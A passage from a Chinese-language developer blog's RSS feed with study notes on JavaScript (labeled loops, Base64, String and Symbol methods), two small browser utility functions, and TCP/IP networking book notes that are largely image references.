  <span>pony</span><span>:</span> <span>for</span> <span>(</span><span>let</span> j <span>=</span> <span>1</span><span>;</span> j <span>&lt;</span> <span>20</span><span>;</span> j<span>++</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>j <span>%</span> <span>2</span> <span>!==</span> <span>0</span><span>)</span> <span>continue</span> pony

    <span>if</span> <span>(</span>ary<span>.</span>length <span>&lt;</span> <span>10</span><span>)</span> <span>{</span>
      ary<span>.</span><span>push</span><span>(</span>i <span>**</span> j<span>)</span>
      <span>break</span> pony
    <span>}</span>

    <span>break</span> jack
  <span>}</span>
<span>}</span>
console<span>.</span><span>log</span><span>(</span>ary<span>)</span> <span>// => [1, 4, 9, 16, 25, 36, 49, 64, 81, 100]</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h2 id="_8-base64"> 8. Base64</h2>
<ul>
<li>
<p>每一个 Base64 字符实际上代表着 6 比特位。因此，3 字节（一字节是 8 比特，3 字节也就是 24 比特）的字符串/二进制文件可以转换成 4 个 Base64 字符(4x6 = 24 比特)。</p>
</li>
<li>
<p>原来的 3 个字节编码后将成为 4 个字节，这意味着 Base64 格式的字符串或文件的尺寸约是原始尺寸的 133%（增加了大约 33%）。如果编码的数据很少，增加的比例可能会更高。</p>
</li>
</ul>
<div><pre><code><span>// 编码</span>
<span>btoa</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => 'Y2xlYXJsb3ZlNw=='</span>

<span>// 解码</span>
<span>atob</span><span>(</span><span>'Y2xlYXJsb3ZlNw=='</span><span>)</span> <span>// => 'clearlove7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>JS 基础</title>
      <link>https://www.matrixtheone.ga/web/note/js/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">JS 基础</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/三国演义.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>String</title>
      <link>https://www.matrixtheone.ga/web/note/js/String/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/String/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">String</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-string-any"> 1. String(any)</h2>
<ul>
<li>构造函数创建字符串。</li>
</ul>
<div><pre><code><span>String</span><span>(</span><span>7</span><span>)</span> <span>// => '7'</span>
<span>String</span><span>(</span><span>{</span><span>}</span><span>)</span> <span>// => '[object Object]'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_2-charat-index"> 2. charAt(index)</h2>
<ul>
<li>返回指定位置的字符，默认位置为 0，超出 length - 1 返回空字符串。</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>charAt</span><span>(</span><span>9</span><span>)</span> <span>// => '7'</span>
<span>'clearlove7'</span><span>.</span><span>charAt</span><span>(</span><span>20</span><span>)</span> <span>// => ''</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_3-charcodeat-index"> 3. charCodeAt(index)</h2>
<ul>
<li>返回指定位置 UTF-16 代码单元（前 128 位于 ASCII 码等同）。</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>charCodeAt</span><span>(</span><span>9</span><span>)</span> <span>// => 55</span>
<span>'clearlove7'</span><span>.</span><span>charCodeAt</span><span>(</span><span>20</span><span>)</span> <span>// => NaN</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_4-string-fromcharcode-number"> 4. String.fromCharCode(number)</h2>
<ul>
<li>UTF-16 代码单元码转字符。</li>
</ul>
<div><pre><code>String<span>.</span><span>fromCharCode</span><span>(</span><span>55</span><span>)</span> <span>// => '7'</span>
String<span>.</span><span>fromCharCode</span><span>(</span><span>78</span><span>,</span> <span>101</span><span>,</span> <span>111</span><span>)</span> <span>// => 'Neo'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_5-indexof-string-beginindex"> 5. indexOf(string, beginIndex)</h2>
<ul>
<li>
<p>返回字符首次出现的索引位置，若无返回 -1。</p>
</li>
<li>
<p>第二个参数为开始查找位置。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>indexOf</span><span>(</span><span>'o'</span><span>)</span> <span>// => 6</span>
<span>'clearlove7'</span><span>.</span><span>indexOf</span><span>(</span><span>'o'</span><span>,</span> <span>7</span><span>)</span> <span>// => -1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_6-lastindexof-string-endindex"> 6. lastIndexOf(string, endIndex)</h2>
<ul>
<li>
<p>返回字符最后出现的索引位置，若无返回 -1。</p>
</li>
<li>
<p>第二个参数为截止查找位置。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>lastIndexOf</span><span>(</span><span>'l'</span><span>)</span> <span>// => 5</span>
<span>'clearlove7'</span><span>.</span><span>lastIndexOf</span><span>(</span><span>'l'</span><span>,</span> <span>4</span><span>)</span> <span>// => 1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_7-search-regexp"> 7. search(regexp)</h2>
<ul>
<li>
<p>返回字符首次出现的索引位置，若无返回 -1。</p>
</li>
<li>
<p>如果传入一个非正则，则会使用 new RegExp(regexp) 隐式地将其转换为正则表达式对象，忽略 //g 标识。</p>
</li>
<li>
<p>与 indexOf 的区别在于可传入正则。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>search</span><span>(</span><span><span>/</span><span>l</span><span>/</span></span><span>)</span> <span>// => 1</span>
<span>'clearlove7'</span><span>.</span><span>search</span><span>(</span><span>'jack'</span><span>)</span> <span>// => -1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_8-includes-string-beginindex"> 8. includes(string, beginIndex)</h2>
<ul>
<li>
<p>判断字符串中是否存在指定字符。</p>
</li>
<li>
<p>第二个参数为开始查找索引。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>includes</span><span>(</span><span>'love'</span><span>)</span> <span>// => true</span>
<span>'clearlove7'</span><span>.</span><span>includes</span><span>(</span><span>'jack'</span><span>)</span> <span>// => false</span>
<span>'clearlove7'</span><span>.</span><span>includes</span><span>(</span><span>'love'</span><span>,</span> <span>7</span><span>)</span> <span>// => false</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_9-substring-beginindex-endindex"> 9. substring(beginIndex, endIndex)</h2>
<ul>
<li>从开始索引截取至结束索引，若结束索引未指定，截取至末尾（包含开始索引，不包含结束索引）。</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>substring</span><span>(</span><span>5</span><span>)</span> <span>// => 'love7'</span>
<span>'clearlove7'</span><span>.</span><span>substring</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>)</span> <span>// => 'lo'</span>
<span>'clearlove7'</span><span>.</span><span>substring</span><span>(</span><span>11</span><span>)</span> <span>// => ''</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_10-slice-beginindex-endindex"> 10. slice(beginIndex, endIndex)</h2>
<ul>
<li>
<p>从开始索引截取至结束索引，若结束索引未指定，截取至末尾，负数反序截取（包含开始索引，不包含结束索引）。</p>
</li>
<li>
<p>与 substring 区别在于参数可以是负数，substring 参数 &lt; 0 时按 0 计算。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>slice</span><span>(</span><span>5</span><span>)</span> <span>// => 'love7'</span>
<span>'clearlove7'</span><span>.</span><span>slice</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>)</span> <span>// => 'lo'</span>
<span>'clearlove7'</span><span>.</span><span>slice</span><span>(</span><span>11</span><span>)</span> <span>// => ''</span>
<span>'clearlove7'</span><span>.</span><span>slice</span><span>(</span><span>-</span><span>5</span><span>,</span> <span>-</span><span>1</span><span>)</span> <span>// => '7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_11-substr-beginindex-length"> 11. substr(beginIndex, length)</h2>
<ul>
<li>从开始索引截取指定数量字符，若数量未指定，截取至末尾（包含开始索引）。</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>substr</span><span>(</span><span>5</span><span>)</span> <span>// => 'love7'</span>
<span>'clearlove7'</span><span>.</span><span>substr</span><span>(</span><span>5</span><span>,</span> <span>2</span><span>)</span> <span>// => 'lo'</span>
<span>'clearlove7'</span><span>.</span><span>substr</span><span>(</span><span>11</span><span>)</span> <span>// => ''</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_12-replace-string-regexp-string-callback"> 12. replace(string | regexp, string | callback)</h2>
<ul>
<li>
<p>替换字符串中指定字符。</p>
</li>
<li>
<p>第二个参数可传递一个回调函数，增删改皆可以用此方法。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>replace</span><span>(</span><span>'l'</span><span>,</span> <span>'7'</span><span>)</span> <span>// => 'c7earlove7'</span>
<span>'clearlove7'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>l</span><span>/</span><span>g</span></span><span>,</span> <span>'7'</span><span>)</span> <span>// => 'c7ear7ove7'</span>

<span>'clearlove7'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(clear)|(7)</span><span>/</span><span>g</span></span><span>,</span> <span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> item <span>===</span> <span>'7'</span> <span>?</span> <span>''</span> <span>:</span> <span>'jack'</span><span>)</span>  <span>// => 'jacklove'</span>

<span>// 隐藏中间四位手机号码</span>
<span>'17777777777'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>^(\d{3})\d{4}(\d{4})$</span><span>/</span></span><span>,</span> <span>'$1****$2'</span><span>)</span> <span>// => 177****7777</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_13-replaceall-string-regexp-string-callback"> 13. replaceAll(string | regexp, string | callback)</h2>
<ul>
<li>
<p>replace 正则 //g 的语法糖。</p>
</li>
<li>
<p>第一个参数为正则时，必须指明全局。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>replaceAll</span><span>(</span><span>'l'</span><span>,</span> <span>'7'</span><span>)</span> <span>// => 'c7ear7ove7'</span>
<span>'clearlove7'</span><span>.</span><span>replaceAll</span><span>(</span><span><span>/</span><span>l</span><span>/</span><span>g</span></span><span>,</span> <span>'7'</span><span>)</span> <span>// => 'c7ear7ove7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_14-repeat-number"> 14. repeat(number)</h2>
<ul>
<li>重复字符串次数。</li>
</ul>
<div><pre><code><span>'7'</span><span>.</span><span>repeat</span><span>(</span><span>7</span><span>)</span> <span>// => '7777777'</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_15-split-string-regexp-number"> 15. split(string | regexp, number)</h2>
<ul>
<li>
<p>分割字符串为数组。</p>
</li>
<li>
<p>第二个参数限制返回数组的长度。</p>
</li>
</ul>
<div><pre><code><span>'clear,love7'</span><span>.</span><span>split</span><span>(</span><span>','</span><span>)</span> <span>// => ['clear', 'love7']</span>
<span>'clear,love7'</span><span>.</span><span>split</span><span>(</span><span>7</span><span>)</span> <span>// => ['clear,love', '']</span>
<span>'clear,love7'</span><span>.</span><span>split</span><span>(</span><span>''</span><span>,</span> <span>5</span><span>)</span> <span>// => ['c', 'l', 'e', 'a', 'r']</span>

<span>// 传入正则</span>
<span>'777love777'</span><span>.</span><span>split</span><span>(</span><span><span>/</span><span>(?:[a-zA-Z]+)</span><span>/</span></span><span>)</span> <span>// => ['777', '777']</span>
<span>'lOve'</span><span>.</span><span>split</span><span>(</span><span><span>/</span><span>(ov)</span><span>/</span><span>i</span></span><span>)</span> <span>// => ['l', 'Ov', 'e']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_16-padstart-targetlength-string-padend-targetlength-string"> 16. padStart(targetLength, string) &amp; padEnd(targetLength, string)</h2>
<ul>
<li>当字符串长度不足时，在首/尾填充指定字符至目标长度。</li>
</ul>
<div><pre><code><span>'clearlove'</span><span>.</span><span>padStart</span><span>(</span><span>10</span><span>,</span> <span>7</span><span>)</span> <span>// => '7clearlove'</span>
<span>'clearlove'</span><span>.</span><span>padEnd</span><span>(</span><span>10</span><span>,</span> <span>'x'</span><span>)</span> <span>// => 'clearlovex'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_17-touppercase-tolowercase"> 17. toUpperCase() &amp; toLowerCase()</h2>
<ul>
<li>转换为大小写。</li>
</ul>
<div><pre><code><span>'clearLove7'</span><span>.</span><span>toUpperCase</span><span>(</span><span>)</span> <span>// => 'CLEARLOVE7'</span>
<span>'clearLove7'</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span> <span>// => 'clearlove7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_18-tolocaleuppercase-locale-tolocalelowercase-locale"> 18. toLocaleUpperCase(locale) &amp; toLocaleLowerCase(locale)</h2>
<ul>
<li>针对地区（浏览器主语言）转换为大小写，推荐此写法。</li>
</ul>
<div><pre><code><span>'clearLove7'</span><span>.</span><span>toLocaleUpperCase</span><span>(</span><span>)</span> <span>// => 'CLEARLOVE7'</span>
<span>'clearLove7'</span><span>.</span><span>toLocaleLowerCase</span><span>(</span><span>)</span> <span>// => 'clearlove7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_19-trim-trimstart-trimend-trimleft-trimright"> 19. trim() &amp; trimStart() &amp; trimEnd() &amp; trimLeft() &amp; trimRight()</h2>
<ul>
<li>清空字符串 [开头][结尾] 空格。</li>
</ul>
<div><pre><code><span>const</span> str <span>=</span> <span>' clear love7 '</span>

str<span>.</span><span>trim</span><span>(</span><span>)</span> <span>// => 'clear love7'</span>
str<span>.</span><span>trimStart</span><span>(</span><span>)</span> <span>// => 'clear love7 '</span>
str<span>.</span><span>trimEnd</span><span>(</span><span>)</span> <span>// => ' clear love7'</span>
str<span>.</span><span>trimLeft</span><span>(</span><span>)</span> <span>// => 'clear love7 '</span>
str<span>.</span><span>trimRight</span><span>(</span><span>)</span> <span>// => ' clear love7'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_20-startswith-string-beginindex"> 20. startsWith(string, beginIndex)</h2>
<ul>
<li>
<p>判断字符串开头字符。</p>
</li>
<li>
<p>第二个参数为开始判断的位置。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>startsWith</span><span>(</span><span>'clear'</span><span>)</span> <span>// => true</span>
<span>'clearlove7'</span><span>.</span><span>startsWith</span><span>(</span><span>'love'</span><span>,</span> <span>5</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_21-endswith-string-length"> 21. endsWith(string, length)</h2>
<ul>
<li>
<p>判断字符串结尾字符。</p>
</li>
<li>
<p>第二个参数为截取字符串的长度。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>endsWith</span><span>(</span><span>'love'</span><span>)</span> <span>// => false</span>
<span>'clearlove7'</span><span>.</span><span>endsWith</span><span>(</span><span>'love'</span><span>,</span> <span>9</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_22-match-regexp"> 22. match(regexp)</h2>
<ul>
<li>
<p>匹配指定的字符。</p>
</li>
<li>
<p>如果传入一个非正则，则会使用 new RegExp(regexp) 隐式地将其转换为正则表达式对象。</p>
</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>match</span><span>(</span><span>'l'</span><span>)</span> <span>// => ['l']</span>
<span>'clearlove7'</span><span>.</span><span>match</span><span>(</span><span><span>/</span><span>l</span><span>/</span><span>g</span></span><span>)</span> <span>// => => ['l', 'l']</span>
<span>'clearlove7'</span><span>.</span><span>match</span><span>(</span><span>'jack'</span><span>)</span> <span>// => null</span>
<span>'clearlove7'</span><span>.</span><span>match</span><span>(</span><span>)</span> <span>// => ['']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_23-matchall-regexp"> 23. matchAll(regexp)</h2>
<ul>
<li>
<p>match 正则 //g 的语法糖，但返回所捕获组的迭代器。</p>
</li>
<li>
<p>参数为正则时，必须指明全局。</p>
</li>
</ul>
<div><pre><code><span>for</span> <span>(</span><span>const</span> i <span>of</span> <span>'clearlove7'</span><span>.</span><span>matchAll</span><span>(</span><span>'l'</span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>i<span>)</span> <span>// => 依次打印：['l'] -> ['l']</span>
<span>for</span> <span>(</span><span>const</span> i <span>of</span> <span>'clearlove7'</span><span>.</span><span>matchAll</span><span>(</span><span><span>/</span><span>l</span><span>/</span><span>g</span></span><span>)</span><span>)</span> console<span>.</span><span>log</span><span>(</span>i<span>)</span> <span>// => 依次打印：['l'] -> ['l']</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_24-concat-any"> 24. concat(any)</h2>
<ul>
<li>等同 + 赋值操作符拼接字符串，但性能不如 + 拼接。</li>
</ul>
<div><pre><code><span>'clearlove'</span><span>.</span><span>concat</span><span>(</span><span>7</span><span>)</span> <span>// => 'clearlove7'</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_25-length"> 25. length</h2>
<ul>
<li>unicode 字符集特殊情况。</li>
</ul>
<div><pre><code><span>'\u2606'</span><span>.</span>length <span>// => 1</span>
</code></pre>
<div><span>1</span><br></div></div><h2 id="_26-at-index"> 26. at(index)</h2>
<ul>
<li>根据索引取值，默认索引为0，负数反序取值。</li>
</ul>
<div><pre><code><span>'clearlove7'</span><span>.</span><span>at</span><span>(</span><span>-</span><span>1</span><span>)</span> <span>// => '7'</span>
</code></pre>
<div><span>1</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Symbol</title>
      <link>https://www.matrixtheone.ga/web/note/js/Symbol/</link>
      <guid>https://www.matrixtheone.ga/web/note/js/Symbol/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Symbol</source>
      <category>JS 基础</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-symbol-string"> 1. Symbol(string)</h2>
<ul>
<li>传入一个描述符返回 symbol 唯一值，不可枚举。</li>
</ul>
<div><pre><code><span>Symbol</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>===</span> <span>Symbol</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => false</span>
Object<span>.</span><span>keys</span><span>(</span><span>{</span> <span>[</span><span>Symbol</span><span>(</span><span>'clearlove'</span><span>)</span><span>]</span><span>:</span> <span>7</span> <span>}</span><span>)</span> <span>// => []</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_2-symbol-for-string"> 2. Symbol.for(string)</h2>
<ul>
<li>搜索全局 symbol 注册表中的 symbol，找到返回此 symbol，未找到则新建一个 symbol 放入注册表中。</li>
</ul>
<div><pre><code>Symbol<span>.</span><span>for</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>===</span> <span>Symbol</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => false</span>
Symbol<span>.</span><span>for</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>===</span> Symbol<span>.</span><span>for</span><span>(</span><span>'clearlove7'</span><span>)</span> <span>// => true</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_3-symbol-keyfor-symbol"> 3. Symbol.keyFor(symbol)</h2>
<ul>
<li>查找全局 symbol 注册表中的 symbol，找到返回描述符，未找到返回 undefined。</li>
</ul>
<div><pre><code>Symbol<span>.</span><span>keyFor</span><span>(</span>Symbol<span>.</span><span>for</span><span>(</span><span>'clearlove7'</span><span>)</span><span>)</span> <span>// => 'clearlove7'</span>
Symbol<span>.</span><span>keyFor</span><span>(</span><span>Symbol</span><span>(</span><span>'jacklove'</span><span>)</span><span>)</span> <span>// => undefined</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>漫画算法 - 小灰的算法进阶</title>
      <link>https://www.matrixtheone.ga/web/note/books/Cartoon-Algorithms-Vol2/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/Cartoon-Algorithms-Vol2/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">漫画算法 - 小灰的算法进阶</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
    </item>
    <item>
      <title>Browser</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Browser/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Browser/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Browser</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-获取设备类型"> 1. 获取设备类型</h2>
<div><pre><code><span>/**
 * @return {string} Mobile | Desktop
 */</span>
<span>export</span> <span>const</span> <span>getDeviceType</span> <span>=</span> <span>(</span><span>)</span> <span>=></span>
  <span><span>/</span><span>Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span>
    navigator<span>.</span>userAgent<span>,</span>
  <span>)</span>
    <span>?</span> <span>'Mobile'</span>
    <span>:</span> <span>'Desktop'</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_2-检测浏览器是否刷新"> 2. 检测浏览器是否刷新</h2>
<div><pre><code><span>/**
 * @return {boolean} true | false
 */</span>
<span>export</span> <span>const</span> <span>checkReload</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>(</span>
    window<span>.</span>performance<span>.</span>navigation<span>?.</span>type <span>===</span> <span>1</span> <span>||</span>
    <span>(</span>
      window<span>.</span>performance<span>.</span><span>getEntriesByType</span><span>(</span>
        <span>'navigation'</span><span>,</span>
      <span>)</span><span>[</span><span>0</span><span>]</span> <span>as</span> PerformanceNavigationTiming
    <span>)</span><span>?.</span>type <span>===</span> <span>'reload'</span>
  <span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>图解 TCP/IP</title>
      <link>https://www.matrixtheone.ga/web/note/books/TCP-IP/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/TCP-IP/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">图解 TCP/IP</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-计算机与网络发展的-7-个阶段"> 1. 计算机与网络发展的 7 个阶段</h2>
<img :src="$withBase('/images/TCP-IP/计算机使用模式的演变.png')" loading="lazy">
<h2 id="_2-协议"> 2. 协议</h2>
<ul>
<li>
<p>随处可见的协议。</p>
<img :src="$withBase('/images/TCP-IP/各种网络体系结构及其协议.png')" loading="lazy">
</li>
<li>
<p>分组交换协议。</p>
<blockquote>
<p>一个较大的数据被分为多个分组时，为了标明是原始数据中的哪一部分，就有必要将分组的序号写入包中。接收端会根据这个序号，再将每个分组按照序号重新装配为原始数据。</p>
</blockquote>
<img :src="$withBase('/images/TCP-IP/分组通信.png')" loading="lazy">
</li>
</ul>
<h2 id="_3-协议分层与-osi-参考模型"> 3. 协议分层与 OSI 参考模型</h2>
<img :src="$withBase('/images/TCP-IP/OSI参考模型各层分工.png')" loading="lazy">
<h2 id="_4-osi-参考模型通信处理举例"> 4. OSI 参考模型通信处理举例</h2>
<img :src="$withBase('/images/TCP-IP/通信与7个分层.png')" loading="lazy">
<h2 id="_5-传输方式的分类"> 5. 传输方式的分类</h2>
<ul>
<li>面向有连接型与面向无连接型。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/面向有连接型与面向无连接型.png')" loading="lazy">
<ul>
<li>电路交换与分组交换。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/电路交换与分组交换的特点.png')" loading="lazy">
<ul>
<li>根据接收端数量分类。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/单播、广播、组播、任播.png')" loading="lazy">
<h2 id="_6-网络的构成要素"> 6. 网络的构成要素</h2>
<ul>
<li>通信媒介与数据链路。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/网络构成要素.png')" loading="lazy">
<img :src="$withBase('/images/TCP-IP/搭建网络的主要设备及其作用.png')" loading="lazy">
<img :src="$withBase('/images/TCP-IP/各种数据链路一览.png')" loading="lazy">
<ul>
<li>网卡：任何一台计算机连接网络时，必须要使用网卡（全称为网络接口卡)。网络接口卡（NIC）有时也被叫做网络适配器、网卡、LAN 卡。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/网卡.png')" loading="lazy">
<ul>
<li>中继器：中继器（Repeater）是在 OSI 模型的第 1 层 —— 物理层面上延长网络的设备。由电缆传过来的电信号或光信号经由中继器的波形调整和放大再传给另一个电缆。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/中继器.png')" loading="lazy">
<ul>
<li>网桥（2 层交换机）：网桥是在 OSI 模型的第 2 层 —— 数据链路层面上连接两个网络的设备。它能够识别数据链路层中的数据帧，并将这些数据帧临时存储于内存，再重新生成信号作为一个全新的帧转发给相连的另一个网段。由于能够存储这些数据帧，网桥能够连接 10BASE-T 与 100BASE-TX 等传输速率完全不同的数据链路，并且不限制连接网段的个数。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/网桥.png')" loading="lazy">
<ul>
<li>路由器（3 层交换机）：路由器是在 OSI 模型的第 3 层 —— 网络层面上连接两个网络、并对分组报文进行转发的设备。网桥是根据物理地址（MAC 地址）进行处理，而路由器（3 层交换机）则是根据 IP 地址进行处理的。由此，TCP/IP 中网络层的地址就成为了 IP 地址。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/路由器.png')" loading="lazy">
<ul>
<li>4~7 层交换机：4~7 层交换机负责处理 OSI 模型中从传输层至应用层的数据。如果用 TCP/IP 分层模型来表述，4~7 层交换机就是以 TCP 等协议的传输层及其上面的应用层为基础，分析收发数据，并对其进行特定的处理。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/4~7层交换机.png')" loading="lazy">
<ul>
<li>网关：网关是 OSI 参考模型中负责将从传输层到应用层的数据进行转换和转发的设备。它与 4~7 层交换机一样都是处理传输层及以上的数据，但是网关不仅转发数据还负责对数据进行转换，它通常会使用一个表示层或应用层网关，在两个不能进行直接通信的协议之间进行翻译，最终实现两者之间的通信。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/网关.png')" loading="lazy">
<h2 id="_7-tcp-ip-出现的背景及其历史"> 7. TCP/IP 出现的背景及其历史</h2>
<img :src="$withBase('/images/TCP-IP/TCP-IP的发展.png')" loading="lazy">
<h2 id="_8-tcp-ip-的标准化"> 8. TCP/IP 的标准化</h2>
<img :src="$withBase('/images/TCP-IP/TCP-IP协议群.png')" loading="lazy">
<h2 id="_9-tcp-ip-协议分层模型"> 9. TCP/IP 协议分层模型</h2>
<img :src="$withBase('/images/TCP-IP/OSI参考模型与TCP-IP的关系.png')" loading="lazy">
<h2 id="_10-tcp-ip-分层模型与通信示例"> 10. TCP/IP 分层模型与通信示例</h2>
<ul>
<li>经过数据链路的包。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/TCP-IP各层对邮件的收发处理.png')" loading="lazy">
<ul>
<li>数据包接受处理。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/分层中的包结构.png')" loading="lazy">
<h2 id="_11-数据链路相关技术"> 11. 数据链路相关技术</h2>
<ul>
<li>MAC 地址。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/IEEE802.3规范的MAC地址格式.png')" loading="lazy">
<ul>
<li>
<p>非共享介质网络。</p>
<blockquote>
<ul>
<li>半双工：只发送或只接收的通信方式。它类似于无线电收发器，若两端同时说话，是听不见对方说的话的。
<img :src="$withBase('/images/TCP-IP/半双工通信.png')" loading="lazy"></li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>全双工：允许在同一时间既可以发送数据也可以接收数据。类似于电话，接打双方可以同时说话。
<img :src="$withBase('/images/TCP-IP/全双工通信.png')" loading="lazy"></li>
</ul>
</blockquote>
</li>
</ul>
<h2 id="_12-以太网"> 12. 以太网</h2>
<ul>
<li>以太网的分类。</li>
</ul>
<img :src="$withBase('/images/TCP-IP/以太网主要分类及其特点.png')" loading="lazy">
<ul>
<li>
<p>以太网帧格式。</p>
<blockquote>
